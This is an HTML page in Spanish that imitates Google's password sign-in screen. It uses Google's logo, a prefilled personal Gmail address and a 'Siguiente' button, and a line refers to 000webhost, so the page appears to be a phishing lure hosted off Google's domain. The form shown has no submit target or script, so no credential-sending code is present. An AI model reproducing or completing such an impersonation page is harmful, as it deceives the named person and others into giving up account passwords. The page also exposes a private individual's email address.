<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acceder</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background-color: #ffffff;
            border-radius: 12px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
            padding: 40px;
            text-align: center;
            width: 100%;
            max-width: 400px;
            position: relative;
            overflow: hidden;
            animation: fadeIn 0.8s ease-in-out;
        }

        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }

        .logo img {
            width: 40px;
            height: auto;
            margin-right: 10px;
        }

        h1 {
            font-size: 18px;
            color: #202124;
            margin: 0;
        }

        h2 {
            font-size: 24px;
            color: #202124;
            margin-bottom: 10px;
        }

        .input-group {
            margin-bottom: 20px;
            position: relative;
        }

        input[type="password"], input[type="email"] {
            width: 100%;
            padding: 15px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            font-size: 16px;
            box-sizing: border-box;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }

        input[type="password"]:focus, input[type="email"]:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 0 0.2rem rgba(26,115,232,.25);
            outline: none;
        }

        .input-group label {
            position: absolute;
            top: 15px;
            left: 15px;
            font-size: 16px;
            color: #666;
            transition: all 0.3s ease;
            pointer-events: none;
            background-color: #ffffff;
            padding: 0 4px;
        }

        input:focus + label, input:not(:placeholder-shown) + label {
            top: -10px;
            left: 10px;
            font-size: 12px;
            color: #1a73e8;
        }

        .forgot-password {
            text-align: left;
            margin-bottom: 20px;
        }

        .forgot-password a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
        }

        p {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 30px;
        }

        p a {
            color: #1a73e8;
            text-decoration: none;
        }

        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .buttons a, .buttons button {
            background-color: #1a73e8;
            color: white;
            text-decoration: none;
            padding: 12px 20px;
            border-radius: 8px;
            border: none;
            cursor: pointer;
            font-size: 14px;
            transition: background-color 0.3s ease;
        }

        .buttons a {
            background-color: transparent;
            color: #1a73e8;
            border: 2px solid #1a73e8;
        }

        .buttons a:hover, .buttons button:hover {
            background-color: #0056b3;
        }

        footer {
            margin-top: 40px;
        }

        footer a {
            color: #1a73e8;
            text-decoration: none;
            margin: 0 10px;
        }

        footer select {
            border: none;
            background: none;
            color: #1a73e8;
        }

        .welcome-message {
            font-size: 20px;
            color: #202124;
            margin-bottom: 20px;
        }

        .user-info {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }

        .user-info img {
            border-radius: 50%;
            margin-right: 10px;
        }

        .checkbox-container {
            display: flex;
            align-items: center;
            justify-content: flex-start;
            margin-bottom: 20px;
        }

        .checkbox-container input {
            margin-right: 10px;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @media (max-width: 480px) {
            .container {
                padding: 20px;
            }

            .logo img {
                width: 30px;
            }

            h1 {
                font-size: 16px;
            }

            h2 {
                font-size: 20px;
            }

            input[type="password"], input[type="email"] {
                padding: 12px;
                font-size: 14px;
            }

            .buttons a, .buttons button {
                padding: 10px 15px;
                font-size: 12px;
            }

            footer a {
                font-size: 12px;
            }

            footer select {
                font-size: 12px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">
                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_74x24dp.png" alt="Google Logo">
                <h1>Acceder con Google</h1>
            </div>
        </header>
        <main>
            <div class="welcome-message">Te damos la bienvenida.</div>
            <div class="user-info">
                <img src="https://www.gravatar.com/avatar/?d=mp" alt="User Avatar" width="32" height="32">
                <span>jefferson.mendoza.vega@gmail.com</span>
            </div>
            <form>
                <div class="input-group">
                    <input type="password" id="password" placeholder=" " required>
                    <label for="password">Ingresa tu contraseña</label>
                </div>
                <div class="checkbox-container">
                    <input type="checkbox" id="show-password">
                    <label for="show-password">Mostrar contraseña</label>
                </div>
                <p>
                    Antes de usar 000webhost, revisa su <a href="#">política de privacidad</a> y <a href="#">condiciones del servicio</a>.
                </p>
                <div class="buttons">
                    <a href="#">¿Olvidaste la contraseña?</a>
                    <button type="submit">Siguiente</button>
                </div>
            </form>
        </main>
        <footer>
            <a href="#">Ayuda</a>
            <a href="#">Privacidad</a>
            <a href="#">Condiciones</a>
            <select>
                <option>Español (Latinoamérica)</option>
            </select>
        </footer>
    </div>
</body>
</html>
